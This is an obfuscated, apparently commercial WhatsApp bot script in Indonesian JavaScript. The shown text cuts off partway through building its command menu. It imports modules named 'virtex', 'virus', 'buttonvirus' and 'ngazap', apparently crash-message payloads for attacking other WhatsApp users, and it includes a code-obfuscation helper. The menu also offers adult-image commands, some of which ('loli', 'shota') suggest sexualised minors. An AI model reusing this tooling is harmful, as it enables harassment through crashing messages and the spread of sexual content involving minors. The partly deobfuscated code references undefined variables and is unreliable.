/*
No Enc? buy wa.me/6287705048235
*/



const { modul } = require('./module'),
  {
    axios,
    baileys,
    chalk,
    cheerio,
    child_process,
    crypto,
    cookie,
    FormData,
    fetch,
    fs,
    ffmpeg,
    jsobfus,
    process,
    moment,
    ms,
    speed,
    util,
  } = modul,
  { exec, spawn, execSync } = child_process,
  {
    BufferJSON,
    WA_DEFAULT_EPHEMERAL,
    generateWAMessageFromContent,
    proto,
    generateWAMessageContent,
    generateWAMessage,
    prepareWAMessageMedia,
    areJidsSameUser,
    getContentType,
  } = baileys,
  {
    smsg,
    formatp,
    tanggal,
    formatDate,
    getTime,
    isUrl,
    sleep,
    clockString,
    runtime,
    fetchJson,
    getBuffer,
    jsonformat,
    format,
    parseMention,
    getRandom,
    reSize,
    generateProfilePicture,
  } = require('./lib/myfunc'),
  { buttonvirus } = require('./scrape/buttonvirus'),
  { buttonvirus2 } = require('./scrape/buttonvirus2'),
  { ngazap } = require('./scrape/ngazap'),
  { virtex } = require('./scrape/virtex'),
  { virus } = require('./scrape/virus'),
  { color, bgcolor } = require('./lib/color'),
  { uptotelegra } = require('./scrape/upload'),
  textpro = require('./scrape/textpro'),
  photooxy = require('./scrape/photooxy'),
  yts = require('./scrape/yt-search'),
  audionye = fs.readFileSync('./y.mp3'),
  owner = JSON.parse(fs.readFileSync('./database/owner.json').toString()),
  prem = JSON.parse(fs.readFileSync('./database/premium.json').toString())
global.db = JSON.parse(fs.readFileSync('./database/database.json'))
if (global.db) {
  global.db = {
    sticker: {},
    database: {},
    game: {},
    others: {},
    users: {},
    chats: {},
    ...(global.db || {}),
  }
}
global.packname = ''
global.author =
  'By Owner Fin Bot WhatsApp\nNomor WhatsApp : 0822-6106-5144\nYoutube : ALWANGANZ OFFICIAL'
global.antilink = false
global.antiwame = false
global.ownerName = 'Creator Fin'
global.ownerNumber = ['62822610651445@s.whatsapp.net']
global.prefa = ['', '.']
global.mess = {
  wait: 'Wait Bro Please be patient',
  succes: 'Good Luck Bro ?',
  admin: 'Group Admin Special Features!!!',
  botAdmin: 'Bots Must Be Admins First!!!',
  owner: 'Ente Kadang-kadang Ente, Nih Khusus Owner Nih!!!',
  group: 'Features Used Only For Groups!!!',
  private: 'Features Used Only For Private Chat!!!',
  bot: 'Bot Number User Special Features!!!',
  error: 'Error Sis, Please Chat Owner...',
  premium:
    'Maaf Sebelumya Kamu Belum Premium, Silahkan Pencet Di Bawah Untuk Beli Premium',
}
module.exports = kayla = async (_0xe67f0c, _0x353dad, _0x521fb4, _0x4a6af4) => {
  try {
    try {
      if (typeof _0x557237 !== 'object') {
        global.db[_0x5acefe(1268)][_0x353dad[_0x5acefe(1306)]] = {}
      }
      if (typeof _0x3b44f8 !== 'object') {
        global.db[_0x5acefe(847)][_0x353dad[_0x5acefe(408)]] = {}
      }
    } catch (_0x1305d3) {
      console[_0x5acefe(1053)](_0x1305d3)
    }
    if (!_0xe67f0c[_0x5acefe(1046)]) {
      if (!_0x353dad[_0x5acefe(1287)].fromMe) {
        return
      }
    }
    !_0x353dad.isGroup &&
      _0x103a69 &&
      !_0x5be5e4 &&
      console[_0x5acefe(1253)](
        '->[\x1B[1;32mCMD\x1B[1;37m]',
        color(
          moment(_0x353dad[_0x5acefe(739)] * 1000)[_0x5acefe(531)](
            _0x5acefe(798)
          ),
          'yellow'
        ),
        color(_0x5d46d4 + _0x6e642b + ' [' + _0x492e22[_0x5acefe(1052)] + ']'),
        'from',
        color(_0x5e314a)
      )
    _0x353dad[_0x5acefe(1118)] &&
      _0x103a69 &&
      !_0x5be5e4 &&
      console[_0x5acefe(1253)](
        _0x5acefe(693),
        color(
          moment(_0x353dad[_0x5acefe(739)] * 1000)[_0x5acefe(531)](
            _0x5acefe(798)
          ),
          _0x5acefe(1303)
        ),
        color(_0x5d46d4 + _0x6e642b + ' [' + _0x492e22.length + ']'),
        'from',
        color(_0x5e314a),
        'in',
        color(_0x4ad6a0)
      )
    if (_0x353dad[_0x5acefe(1306)][_0x5acefe(936)](_0x5acefe(1282))) {
      return _0xe67f0c.updateBlockStatus(_0x353dad.sender, _0x5acefe(1127))
    }
    try {
      ppuser = await _0xe67f0c[_0x5acefe(452)](
        _0x353dad.sender,
        _0x5acefe(1205)
      )
    } catch (_0x5c9ca7) {
      ppuser = _0x5acefe(922)
    }
    ppnyauser = await reSize(ppuser, 200, 200)
    _0x6e642b &&
      (_0xe67f0c[_0x5acefe(715)]('composing', _0x353dad[_0x5acefe(408)]),
      _0xe67f0c.readMessages([_0x353dad[_0x5acefe(1287)]]))
    async function _0x534106(_0x68555a) {
      return new Promise(async (_0x2bbb54, _0x35ac9b) => {
        let _0x1fb889 = _0x68555a.toLowerCase().replace(/[()*]/g, ''),
          _0x36826a = _0x1fb889.replace(/\s/g, '-'),
          _0xec205e = Math.floor(Math.random() * 5)
        axios
          .get(
            'http://cerpenmu.com/category/cerpen-' +
              _0x36826a +
              '/page/' +
              _0xec205e
          )
          .then((_0x5a0fc4) => {
            let _0x8fb26d = cheerio.load(_0x5a0fc4.data),
              _0x5183d9 = []
            _0x8fb26d('article.post').each(function (_0x4d3b1b, _0x57b49e) {
              _0x5183d9.push(_0x8fb26d(_0x57b49e).find('a').attr('href'))
            })
            let _0x4c088e =
              _0x5183d9[Math.floor(Math.random() * _0x5183d9.length)]
            axios.get(_0x4c088e).then((_0x4c77c0) => {
              let _0x320dd4 = cheerio.load(_0x4c77c0.data),
                _0x1e662f = {
                  title: _0x320dd4('#content > article > h1').text(),
                  author: _0x320dd4('#content > article')
                    .text()
                    .split('Cerpen Karangan: ')[1]
                    .split('Kategori: ')[0],
                  kategori: _0x320dd4('#content > article')
                    .text()
                    .split('Kategori: ')[1]
                    .split('\n')[0],
                  lolos: _0x320dd4('#content > article')
                    .text()
                    .split('Lolos moderasi pada: ')[1]
                    .split('\n')[0],
                  cerita: _0x320dd4('#content > article > p').text(),
                }
              _0x2bbb54(_0x1e662f)
            })
          })
      })
    }
    async function _0x5426e1(_0x3d617e) {
      const _0x8ac2f2 = _0x5acefe
      try {
        const _0x3978d6 = await axios[_0x8ac2f2(1109)](
          _0x8ac2f2(494) + _0x3d617e
        )
        let _0x4e8f2e = cheerio[_0x8ac2f2(476)](_0x3978d6[_0x8ac2f2(1048)]),
          _0x523780 = _0x4e8f2e(_0x8ac2f2(878)).attr(_0x8ac2f2(980))
        const _0x1a0f9b = {
            url: _0x3d617e,
            token: _0x523780,
          },
          { data: _0x2f7dc6 } = await axios.request(_0x8ac2f2(761), {
            method: _0x8ac2f2(1383),
            data: new URLSearchParams(Object[_0x8ac2f2(1116)](_0x1a0f9b)),
            headers: {
              'content-type': _0x8ac2f2(1170),
              'user-agent':
                'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Safari/537.36',
              referer: _0x8ac2f2(381),
            },
          })
        return {
          status: 200,
          title: _0x2f7dc6.title,
          thumbnail: 'https:' + _0x2f7dc6[_0x8ac2f2(912)],
          duration: _0x2f7dc6.duration,
          media: _0x2f7dc6[_0x8ac2f2(760)],
        }
      } catch (_0x680a8b) {
        return _0x680a8b
      }
    }
    async function _0x281f40(_0x3f2949) {
      return new Promise((_0x3a42f5, _0x17eca5) => {
        try {
          const _0x3fe79a = jsobfus.obfuscate(_0x3f2949, {
              compact: false,
              controlFlowFlattening: true,
              controlFlowFlatteningThreshold: 1,
              numbersToExpressions: true,
              simplify: true,
              stringArrayShuffle: true,
              splitStrings: true,
              stringArrayThreshold: 1,
            }),
            _0x2a4ebe = {
              status: 200,
              author: 'Kayla',
              result: _0x3fe79a.getObfuscatedCode(),
            }
          _0x3a42f5(_0x2a4ebe)
        } catch (_0x22de7a) {
          _0x17eca5(_0x22de7a)
        }
      })
    }
    async function _0x263382(_0xf3b789) {
      return new Promise((_0x1d81d1, _0x242bde) => {
        axios
          .get('http://qaz.wtf/u/convert.cgi?text=' + _0xf3b789)
          .then(({ data: _0x1804d8 }) => {
            let _0x212596 = cheerio.load(_0x1804d8),
              _0x1f7bd0 = []
            _0x212596('table > tbody > tr').each(function (
              _0x28453b,
              _0x465a17
            ) {
              _0x1f7bd0.push({
                name: _0x212596(_0x465a17)
                  .find('td:nth-child(1) > span')
                  .text(),
                result: _0x212596(_0x465a17)
                  .find('td:nth-child(2)')
                  .text()
                  .trim(),
              })
            })
            _0x1d81d1(_0x1f7bd0)
          })
      })
    }
    async function _0x155d6c() {
      return new Promise((_0x12b4a0, _0x12369c) => {
        const _0x5e0363 = Math.floor(Math.random() * 1153)
        axios
          .get('https://sfmcompile.club/page/' + _0x5e0363)
          .then((_0x4e830a) => {
            const _0x2ed938 = cheerio.load(_0x4e830a.data),
              _0x3f821a = []
            _0x2ed938('#primary > div > div > ul > li > article').each(
              function (_0x1743f8, _0x1b32c2) {
                _0x3f821a.push({
                  title: _0x2ed938(_0x1b32c2).find('header > h2').text(),
                  link: _0x2ed938(_0x1b32c2)
                    .find('header > h2 > a')
                    .attr('href'),
                  category: _0x2ed938(_0x1b32c2)
                    .find('header > div.entry-before-title > span > span')
                    .text()
                    .replace('in ', ''),
                  share_count: _0x2ed938(_0x1b32c2)
                    .find(
                      'header > div.entry-after-title > p > span.entry-shares'
                    )
                    .text(),
                  views_count: _0x2ed938(_0x1b32c2)
                    .find(
                      'header > div.entry-after-title > p > span.entry-views'
                    )
                    .text(),
                  type:
                    _0x2ed938(_0x1b32c2).find('source').attr('type') ||
                    'image/jpeg',
                  video_1:
                    _0x2ed938(_0x1b32c2).find('source').attr('src') ||
                    _0x2ed938(_0x1b32c2).find('img').attr('data-src'),
                  video_2:
                    _0x2ed938(_0x1b32c2).find('video > a').attr('href') || '',
                })
              }
            )
            _0x12b4a0(_0x3f821a)
          })
      })
    }
    async function _0xc94dd2(
      _0x1217d0,
      _0x252e2e,
      _0x178519,
      _0x4af99f,
      _0x3a3b30,
      _0x356c46,
      _0x19851b,
      _0xdd462b
    ) {
      const _0x330988 = _0x5acefe
      let _0x5ade7c = {
          listMessage: {
            title: _0x252e2e,
            description: _0x178519,
            listType: 2,
            productListInfo: {
              productSections: [
                {
                  title: _0x252e2e,
                  products: _0x19851b,
                },
              ],
              headerImage: {
                productId: _0xdd462b,
                jpegThumbnail: _0x3a3b30,
              },
              businessOwnerJid: _0x356c46,
            },
            footerText: _0x4af99f,
          },
        },
        _0x4ce60b = await generateWAMessageFromContent(_0x1217d0, _0x5ade7c, {
          quoted: _0xb17d82,
        })
      return _0xe67f0c[_0x330988(1318)](
        _0x4ce60b[_0x330988(1287)][_0x330988(1224)],
        _0x4ce60b[_0x330988(989)],
        { messageId: '' }
      )
    }
    async function _0x3b9ed4(_0x409e5c) {
      const _0x33a442 = _0x5acefe
      let _0x5683f2 = [
        {
          buttonId: _0x33a442(790),
          buttonText: { displayText: _0x33a442(1149) },
          type: 1,
        },
      ]
      return _0xe67f0c.sendButtonText(
        _0x353dad[_0x33a442(408)],
        _0x5683f2,
        _0x409e5c,
        _0x33a442(1266),
        _0x353dad
      )
    }
    if (
      _0x353dad[_0x5acefe(1118)] &&
      !_0x353dad[_0x5acefe(1287)][_0x5acefe(1212)] &&
      !_0x3c922f &&
      antilink
    ) {
      if (!_0x21aa2e) {
        return
      }
      _0x4eba49[_0x5acefe(921)](_0x5acefe(892)) &&
        (_0xe67f0c[_0x5acefe(655)](
          _0x353dad.chat,
          { text: _0x5acefe(563) + _0x322a91[_0x5acefe(1277)] },
          { quoted: _0x353dad }
        ),
        _0xe67f0c[_0x5acefe(984)](
          _0x353dad[_0x5acefe(408)],
          [_0x5ca45c],
          _0x5acefe(772)
        ))
    }
    if (
      _0x353dad[_0x5acefe(1118)] &&
      !_0x353dad.key.fromMe &&
      !_0x3c922f &&
      antiwame
    ) {
      if (!_0x21aa2e) {
        return
      }
      _0x4eba49[_0x5acefe(921)](_0x5acefe(1125)) &&
        (_0xe67f0c[_0x5acefe(655)](
          _0x353dad[_0x5acefe(408)],
          { text: _0x5acefe(563) + _0x322a91[_0x5acefe(1277)] },
          { quoted: _0x353dad }
        ),
        _0xe67f0c[_0x5acefe(984)](
          _0x353dad[_0x5acefe(408)],
          [_0x5ca45c],
          'remove'
        ))
    }
    switch (_0x6e642b) {
      case _0x5acefe(793):
        mbc =
          _0x5acefe(1196) +
          _0x5ca45c[_0x5acefe(824)]('@')[0] +
          _0x5acefe(759) +
          _0x5d46d4 +
          'bc \uD83C\uDD5E\n' +
          _0x5d46d4 +
          _0x5acefe(774) +
          _0x5d46d4 +
          _0x5acefe(756) +
          _0x5d46d4 +
          _0x5acefe(1190) +
          _0x5d46d4 +
          _0x5acefe(707) +
          _0x5d46d4 +
          _0x5acefe(666) +
          _0x5d46d4 +
          'delowner \uD83C\uDD5E\n\n   Other Menu\n' +
          _0x5d46d4 +
          _0x5acefe(1337) +
          _0x5d46d4 +
          _0x5acefe(986) +
          _0x5d46d4 +
          'buypremium\n' +
          _0x5d46d4 +
          'jadibot\n' +
          _0x5d46d4 +
          'jadiowner\n' +
          _0x5d46d4 +
          _0x5acefe(639) +
          _0x5d46d4 +
          _0x5acefe(871) +
          _0x5d46d4 +
          'styletext \uD83C\uDD55\n' +
          _0x5d46d4 +
          _0x5acefe(1222) +
          _0x5d46d4 +
          _0x5acefe(1421) +
          _0x5d46d4 +
          _0x5acefe(1143) +
          _0x5d46d4 +
          'tomp3 \uD83C\uDD55\n' +
          _0x5d46d4 +
          _0x5acefe(603) +
          _0x5d46d4 +
          _0x5acefe(1187) +
          _0x5d46d4 +
          _0x5acefe(1157) +
          _0x5d46d4 +
          _0x5acefe(1273) +
          _0x5d46d4 +
          'tiktok \uD83C\uDD55\n' +
          _0x5d46d4 +
          _0x5acefe(549) +
          _0x5d46d4 +
          'ytsearch \uD83C\uDD55\n' +
          _0x5d46d4 +
          _0x5acefe(1074) +
          _0x5d46d4 +
          _0x5acefe(1359) +
          _0x5d46d4 +
          _0x5acefe(606) +
          _0x5d46d4 +
          _0x5acefe(468) +
          _0x5d46d4 +
          _0x5acefe(1079) +
          _0x5d46d4 +
          _0x5acefe(745) +
          _0x5d46d4 +
          _0x5acefe(928) +
          _0x5d46d4 +
          _0x5acefe(1372) +
          _0x5d46d4 +
          _0x5acefe(1191) +
          _0x5d46d4 +
          _0x5acefe(1393) +
          _0x5d46d4 +
          _0x5acefe(776) +
          _0x5d46d4 +
          _0x5acefe(599) +
          _0x5d46d4 +
          _0x5acefe(1245) +
          _0x5d46d4 +
          _0x5acefe(867) +
          _0x5d46d4 +
          _0x5acefe(970) +
          _0x5d46d4 +
          _0x5acefe(885) +
          _0x5d46d4 +
          _0x5acefe(1241) +
          _0x5d46d4 +
          'vngas \uD83C\uDD5E\n' +
          _0x5d46d4 +
          _0x5acefe(1247) +
          _0x5d46d4 +
          _0x5acefe(527) +
          _0x5d46d4 +
          _0x5acefe(684) +
          _0x5d46d4 +
          _0x5acefe(1354) +
          _0x5d46d4 +
          _0x5acefe(1386) +
          _0x5d46d4 +
          'antilink \uD83C\uDD56\n' +
          _0x5d46d4 +
          _0x5acefe(455) +
          _0x5d46d4 +
          _0x5acefe(694) +
          _0x5d46d4 +
          _0x5acefe(1227) +
          _0x5d46d4 +
          _0x5acefe(622) +
          _0x5d46d4 +
          'demote \uD83C\uDD56\n' +
          _0x5d46d4 +
          _0x5acefe(1407) +
          _0x5d46d4 +
          _0x5acefe(919) +
          _0x5d46d4 +
          'aesthetic \uD83C\uDD5F\n' +
          _0x5d46d4 +
          _0x5acefe(536) +
          _0x5d46d4 +
          _0x5acefe(979) +
          _0x5d46d4 +
          _0x5acefe(1069) +
          _0x5d46d4 +
          _0x5acefe(959) +
          _0x5d46d4 +
          _0x5acefe(1225) +
          _0x5d46d4 +
          _0x5acefe(1152) +
          _0x5d46d4 +
          _0x5acefe(665) +
          _0x5d46d4 +
          'asuna \uD83C\uDD5F\n' +
          _0x5d46d4 +
          'ayuzawa \uD83C\uDD5F\n' +
          _0x5d46d4 +
          _0x5acefe(728) +
          _0x5d46d4 +
          _0x5acefe(1159) +
          _0x5d46d4 +
          _0x5acefe(1311) +
          _0x5d46d4 +
          'bts \uD83C\uDD5F\n' +
          _0x5d46d4 +
          _0x5acefe(1077) +
          _0x5d46d4 +
          _0x5acefe(1228) +
          _0x5d46d4 +
          _0x5acefe(1091) +
          _0x5d46d4 +
          _0x5acefe(814) +
          _0x5d46d4 +
          _0x5acefe(1071) +
          _0x5d46d4 +
          _0x5acefe(781) +
          _0x5d46d4 +
          'cosplaysagiri \uD83C\uDD5F\n' +
          _0x5d46d4 +
          _0x5acefe(630) +
          _0x5d46d4 +
          _0x5acefe(1328) +
          _0x5d46d4 +
          'cyber \uD83C\uDD5F\n' +
          _0x5d46d4 +
          'darkjokes \uD83C\uDD5F\n' +
          _0x5d46d4 +
          _0x5acefe(1150) +
          _0x5d46d4 +
          'doraemon \uD83C\uDD5F\n' +
          _0x5d46d4 +
          _0x5acefe(1015) +
          _0x5d46d4 +
          _0x5acefe(412) +
          _0x5d46d4 +
          _0x5acefe(890) +
          _0x5d46d4 +
          'ero \uD83C\uDD5F\n' +
          _0x5d46d4 +
          _0x5acefe(1065) +
          _0x5d46d4 +
          _0x5acefe(504) +
          _0x5d46d4 +
          'femdom \uD83C\uDD5F\n' +
          _0x5d46d4 +
          'foot \uD83C\uDD5F\n' +
          _0x5d46d4 +
          'freefire \uD83C\uDD5F\n' +
          _0x5d46d4 +
          _0x5acefe(480) +
          _0x5d46d4 +
          _0x5acefe(1345) +
          _0x5d46d4 +
          _0x5acefe(1320) +
          _0x5d46d4 +
          _0x5acefe(779) +
          _0x5d46d4 +
          _0x5acefe(535) +
          _0x5d46d4 +
          _0x5acefe(835) +
          _0x5d46d4 +
          _0x5acefe(469) +
          _0x5d46d4 +
          'hestia \uD83C\uDD5F\n' +
          _0x5d46d4 +
          _0x5acefe(442) +
          _0x5d46d4 +
          _0x5acefe(1338) +
          _0x5d46d4 +
          _0x5acefe(483) +
          _0x5d46d4 +
          'inori \uD83C\uDD5F\n' +
          _0x5d46d4 +
          'islamic \uD83C\uDD5F\n' +
          _0x5d46d4 +
          _0x5acefe(389) +
          _0x5d46d4 +
          _0x5acefe(1145) +
          _0x5d46d4 +
          _0x5acefe(1000) +
          _0x5d46d4 +
          _0x5acefe(829) +
          _0x5d46d4 +
          _0x5acefe(386) +
          _0x5d46d4 +
          _0x5acefe(918) +
          _0x5d46d4 +
          _0x5acefe(751) +
          _0x5d46d4 +
          _0x5acefe(1169) +
          _0x5d46d4 +
          _0x5acefe(1183) +
          _0x5d46d4 +
          _0x5acefe(1319) +
          _0x5d46d4 +
          _0x5acefe(1035) +
          _0x5d46d4 +
          _0x5acefe(1308) +
          _0x5d46d4 +
          _0x5acefe(1392) +
          _0x5d46d4 +
          'keneki \uD83C\uDD5F\n' +
          _0x5d46d4 +
          _0x5acefe(704) +
          _0x5d46d4 +
          _0x5acefe(1064) +
          _0x5d46d4 +
          _0x5acefe(879) +
          _0x5d46d4 +
          _0x5acefe(567) +
          _0x5d46d4 +
          _0x5acefe(736) +
          _0x5d46d4 +
          'loli \uD83C\uDD5F\n' +
          _0x5d46d4 +
          _0x5acefe(1272) +
          _0x5d46d4 +
          _0x5acefe(1195) +
          _0x5d46d4 +
          _0x5acefe(796) +
          _0x5d46d4 +
          _0x5acefe(657) +
          _0x5d46d4 +
          'mikey \uD83C\uDD5F\n' +
          _0x5d46d4 +
          'miku \uD83C\uDD5F\n' +
          _0x5d46d4 +
          _0x5acefe(1425) +
          _0x5d46d4 +
          _0x5acefe(683) +
          _0x5d46d4 +
          _0x5acefe(570) +
          _0x5d46d4 +
          _0x5acefe(1147) +
          _0x5d46d4 +
          _0x5acefe(1082) +
          _0x5d46d4 +
          _0x5acefe(740) +
          _0x5d46d4 +
          _0x5acefe(1132) +
          _0x5d46d4 +
          _0x5acefe(720) +
          _0x5d46d4 +
          _0x5acefe(849) +
          _0x5d46d4 +
          _0x5acefe(1004) +
          _0x5d46d4 +
          _0x5acefe(1213) +
          _0x5d46d4 +
          'orgy \uD83C\uDD5F\n' +
          _0x5d46d4 +
          _0x5acefe(501) +
          _0x5d46d4 +
          _0x5acefe(1067) +
          _0x5d46d4 +
          _0x5acefe(1263) +
          _0x5d46d4 +
          _0x5acefe(451) +
          _0x5d46d4 +
          _0x5acefe(647) +
          _0x5d46d4 +
          _0x5acefe(384) +
          _0x5d46d4 +
          'pussy \uD83C\uDD5F\n' +
          _0x5d46d4 +
          _0x5acefe(597) +
          _0x5d46d4 +
          _0x5acefe(1255) +
          _0x5d46d4 +
          _0x5acefe(1201) +
          _0x5d46d4 +
          _0x5acefe(426) +
          _0x5d46d4 +
          'rose \uD83C\uDD5F\n' +
          _0x5d46d4 +
          'ryujin \uD83C\uDD5F\n' +
          _0x5d46d4 +
          'sagiri \uD83C\uDD5F\n' +
          _0x5d46d4 +
          _0x5acefe(1385) +
          _0x5d46d4 +
          _0x5acefe(1234) +
          _0x5d46d4 +
          _0x5acefe(562) +
          _0x5d46d4 +
          _0x5acefe(1329) +
          _0x5d46d4 +
          'shinka \uD83C\uDD5F\n' +
          _0x5d46d4 +
          _0x5acefe(938) +
          _0x5d46d4 +
          _0x5acefe(783) +
          _0x5d46d4 +
          'shota \uD83C\uDD5F\n' +
          _0x5d46d4 +
          _0x5acefe(1322) +
          _0x5d46d4 +
          'technology \uD83C\uDD5F\n' +
          _0x5d46d4 +
          _0x5acefe(749) +
          _0x5d46d4 +
          _0x5acefe(1050) +
          _0x5d46d4 +
          'thighs \uD83C\uDD5F\n' +
          _0x5d46d4 +
          _0x5acefe(732) +
          _0x5d46d4 +
          'tsunade \uD83C\uDD5F\n' +
          _0x5d46d4 +
          'waifu \uD83C\uDD5F\n' +
          _0x5d46d4 +
          _0x5acefe(1163) +
          _0x5d46d4 +
          _0x5acefe(862) +
          _0x5d46d4 +
          _0x5acefe(1406) +
          _0x5d46d4 +
          'yotsuba \uD83C\uDD5F\n' +
          _0x5d46d4 +
          'yuki \uD83C\uDD5F\n' +
          _0x5d46d4 +
          _0x5acefe(669) +
          _0x5d46d4 +
          _0x5acefe(952) +
          _0x5d46d4 +
          'fox \uD83C\uDD5F  \n' +
          _0x5d46d4 +
          _0x5acefe(1206) +
          _0x5d46d4 +
          _0x5acefe(966) +
          _0x5d46d4 +
          'panda \uD83C\uDD5F  \n' +
          _0x5d46d4 +
          'birb \uD83C\uDD5F \n' +
          _0x5d46d4 +
          'koala \uD83C\uDD5F\n\n   Text Pro\n' +
          _0x5d46d4 +
          _0x5acefe(643) +
          _0x5d46d4 +
          _0x5acefe(1158) +
          _0x5d46d4 +
          _0x5acefe(923) +
          _0x5d46d4 +
          _0x5acefe(1088) +
          _0x5d46d4 +
          'deepsea \uD83C\uDD5F \n' +
          _0x5d46d4 +
          _0x5acefe(706) +
          _0x5d46d4 +
          'rainbow \uD83C\uDD5F \n' +
          _0x5d46d4 +
          _0x5acefe(957) +
          _0x5d46d4 +
          _0x5acefe(1028) +
          _0x5d46d4 +
          'pencil \uD83C\uDD5F \n' +
          _0x5d46d4 +
          _0x5acefe(371) +
          _0x5d46d4 +
          _0x5acefe(1040) +
          _0x5d46d4 +
          _0x5acefe(1402) +
          _0x5d46d4 +
          _0x5acefe(827) +
          _0x5d46d4 +
          _0x5acefe(747) +
          _0x5d46d4 +
          'transformer \uD83C\uDD5F \n' +
          _0x5d46d4 +
          _0x5acefe(611) +
          _0x5d46d4 +
          'thunder \uD83C\uDD5F \n' +
          _0x5d46d4 +
          _0x5acefe(722) +
          _0x5d46d4 +
          _0x5acefe(941) +
          _0x5d46d4 +
          _0x5acefe(509) +
          _0x5d46d4 +
          'glitch \uD83C\uDD5F \n' +
          _0x5d46d4 +
          _0x5acefe(967) +
          _0x5d46d4 +
          _0x5acefe(1374) +
          _0x5d46d4 +
          _0x5acefe(585) +
          _0x5d46d4 +
          _0x5acefe(953) +
          _0x5d46d4 +
          _0x5acefe(464) +
          _0x5d46d4 +
          _0x5acefe(496) +
          _0x5d46d4 +
          _0x5acefe(737) +
          _0x5d46d4 +
          _0x5acefe(1104) +
          _0x5d46d4 +
          'snow \uD83C\uDD5F \n' +
          _0x5d46d4 +
          _0x5acefe(505) +
          _0x5d46d4 +
          _0x5acefe(1076) +
          _0x5d46d4 +
          _0x5acefe(1121) +
          _0x5d46d4 +
          _0x5acefe(582) +
          _0x5d46d4 +
          _0x5acefe(636) +
          _0x5d46d4 +
          _0x5acefe(1039) +
          _0x5d46d4 +
          _0x5acefe(439) +
          _0x5d46d4 +
          _0x5acefe(446) +
          _0x5d46d4 +
          'matrix \uD83C\uDD5F \n' +
          _0x5d46d4 +
          _0x5acefe(697) +
          _0x5d46d4 +
          _0x5acefe(437) +
          _0x5d46d4 +
          _0x5acefe(602) +
          _0x5d46d4 +
          'lava \uD83C\uDD5F \n' +
          _0x5d46d4 +
          _0x5acefe(1290) +
          _0x5d46d4 +
          'bloodglas \uD83C\uDD5F \n' +
          _0x5d46d4 +
          _0x5acefe(887) +
          _0x5d46d4 +
          _0x5acefe(649) +
          _0x5d46d4 +
          _0x5acefe(1294) +
          _0x5d46d4 +
          _0x5acefe(1198) +
          _0x5d46d4 +
          'firework \uD83C\uDD5F \n' +
          _0x5d46d4 +
          _0x5acefe(466) +
          _0x5d46d4 +
          _0x5acefe(1269) +
          _0x5d46d4 +
          'sand \uD83C\uDD5F \n' +
          _0x5d46d4 +
          _0x5acefe(743) +
          _0x5d46d4 +
          _0x5acefe(1333) +
          _0x5d46d4 +
          _0x5acefe(1430) +
          _0x5d46d4 +
          _0x5acefe(1351) +
          _0x5d46d4 +
          _0x5acefe(1391) +
          _0x5d46d4 +
          _0x5acefe(1218) +
          _0x5d46d4 +
          _0x5acefe(1164) +
          _0x5d46d4 +
          _0x5acefe(1154) +
          _0x5d46d4 +
          _0x5acefe(1233) +
          _0x5d46d4 +
          'love \uD83C\uDD5F \n' +
          _0x5d46d4 +
          _0x5acefe(1087) +
          _0x5d46d4 +
          _0x5acefe(956) +
          _0x5d46d4 +
          _0x5acefe(1299) +
          _0x5d46d4 +
          'underwaterocean \uD83C\uDD5F\n' +
          _0x5d46d4 +
          _0x5acefe(690) +
          _0x5d46d4 +
          _0x5acefe(383) +
          _0x5d46d4 +
          'rainboweffect \uD83C\uDD5F\n' +
          _0x5d46d4 +
          _0x5acefe(573) +
          _0x5d46d4 +
          'metalliceffect \uD83C\uDD5F\n' +
          _0x5d46d4 +
          _0x5acefe(841) +
          _0x5d46d4 +
          _0x5acefe(498) +
          _0x5d46d4 +
          'cerpen_sejarah \uD83C\uDD5F\n' +
          _0x5d46d4 +
          _0x5acefe(817) +
          _0x5d46d4 +
          _0x5acefe(479) +
          _0x5d46d4 +
          _0x5acefe(1420) +
          _0x5d46d4 +
          _0x5acefe(752) +
          _0x5d46d4 +
          'cerpen_rindu \uD83C\uDD5F\n' +
          _0x5d46d4 +
          _0x5acefe(526) +
          _0x5d46d4 +
          _0x5acefe(794) +
          _0x5d46d4 +
          'cerpen_petualangan \uD83C\uDD5F\n' +
          _0x5d46d4 +
          'cerpen_persahabatan \uD83C\uDD5F\n' +
          _0x5d46d4 +
          _0x5acefe(1166) +
          _0x5d46d4 +
          'cerpen_perjuangan \uD83C\uDD5F\n' +
          _0x5d46d4 +
          _0x5acefe(506) +
          _0x5d46d4 +
          _0x5acefe(948) +
          _0x5d46d4 +
          _0x5acefe(854) +
          _0x5d46d4 +
          'cerpen_pendidikan \uD83C\uDD5F\n' +
          _0x5d46d4 +
          _0x5acefe(1099) +
          _0x5d46d4 +
          _0x5acefe(1399) +
          _0x5d46d4 +
          _0x5acefe(591) +
          _0x5d46d4 +
          _0x5acefe(1216) +
          _0x5d46d4 +
          _0x5acefe(1207) +
          _0x5d46d4 +
          _0x5acefe(653) +
          _0x5d46d4 +
          'cerpen_misteri \uD83C\uDD5F\n' +
          _0x5d46d4 +
          _0x5acefe(609) +
          _0x5d46d4 +
          'cerpen_malaysia \uD83C\uDD5F\n' +
          _0x5d46d4 +
          _0x5acefe(1095) +
          _0x5d46d4 +
          'cerpen_kristen \uD83C\uDD5F\n' +
          _0x5d46d4 +
          _0x5acefe(813) +
          _0x5d46d4 +
          _0x5acefe(545) +
          _0x5d46d4 +
          'cerpen_keluarga \uD83C\uDD5F\n' +
          _0x5d46d4 +
          _0x5acefe(1066) +
          _0x5d46d4 +
          _0x5acefe(1114) +
          _0x5d46d4 +
          _0x5acefe(973) +
          _0x5d46d4 +
          _0x5acefe(894) +
          _0x5d46d4 +
          _0x5acefe(1363) +
          _0x5d46d4 +
          'cerpen_cintasejati \uD83C\uDD5F\n' +
          _0x5d46d4 +
          'cerpen_cintasegitiga \uD83C\uDD5F\n' +
          _0x5d46d4 +
          _0x5acefe(932) +
          _0x5d46d4 +
          'cerpen_cintaromantis \uD83C\uDD5F\n' +
          _0x5d46d4 +
          'cerpen_cintapertama \uD83C\uDD5F\n' +
          _0x5d46d4 +
          _0x5acefe(644) +
          _0x5d46d4 +
          _0x5acefe(368) +
          _0x5d46d4 +
          _0x5acefe(397) +
          _0x5d46d4 +
          _0x5acefe(975) +
          _0x5d46d4 +
          _0x5acefe(891) +
          _0x5d46d4 +
          'cerpen_bahasainggris \uD83C\uDD5F\n' +
          _0x5d46d4 +
          _0x5acefe(620) +
          _0x5d46d4 +
          _0x5acefe(632) +
          _0x5d46d4 +
          _0x5acefe(695) +
          _0x5d46d4 +
          'bocil \uD83C\uDD5F\n' +
          _0x5d46d4 +
          _0x5acefe(831) +
          _0x5d46d4 +
          _0x5acefe(1309) +
          _0x5d46d4 +
